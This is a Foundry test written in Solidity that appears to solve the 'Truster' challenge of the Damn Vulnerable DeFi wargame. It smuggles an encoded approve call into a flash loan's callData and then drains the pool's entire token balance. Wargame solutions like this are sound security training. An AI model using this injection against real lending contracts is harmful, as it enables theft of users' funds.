// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../Contracts/truster/TrusterLenderPool.sol";

contract Truster is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        //@audit-issue an approve function can be passed into the callData param
        //@audit-issue We will use this amount in our allowance call
        //@audit-issue next, call the flashloan using the allowance payload
        //@audit-issue finally, call transferFrom using the trusterLenderPool addr and transfer poolBalance to attacker.
        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
        vm.prank(attacker);
        bytes memory approvalCallData = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            poolBalance
        );
        trusterLenderPool.flashLoan(
            0,
            attacker,
            address(dvt),
            approvalCallData
        );
        vm.prank(attacker);
        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
